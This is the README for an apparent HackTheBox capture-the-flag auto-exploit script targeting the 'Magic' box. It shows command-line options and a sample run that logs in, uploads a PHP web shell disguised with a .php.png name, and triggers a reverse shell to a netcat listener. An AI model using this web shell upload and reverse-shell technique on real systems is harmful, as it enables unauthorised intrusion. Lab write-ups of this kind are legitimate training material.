# Magic Box Auto Exploitation Script

This script exploit Auto Hack the Magic Box on HacktheBox using python as Programing language.

## Help Menu 

```
$ ./exploit.py -h
usage: exploit.py [-h] -r RHOST -l LHOST -p LPORT

optional arguments:
  -h, --help            show this help message and exit
  -r RHOST, --rhost RHOST
                        Remote HTTP IP
  -l LHOST, --lhost LHOST
                        Local Netcat IP
  -p LPORT, --lport LPORT
                        Local Netcat Port
```


## Example of use

```
 $ ./exploit.py -r 10.10.10.185 -l 10.10.xx.xx -p 4443

[+] Login Successfully
[+] Shell yndLRknzSTRlTyJh.php.png UPloaded Successfully.
[*] Check your NetCat

```
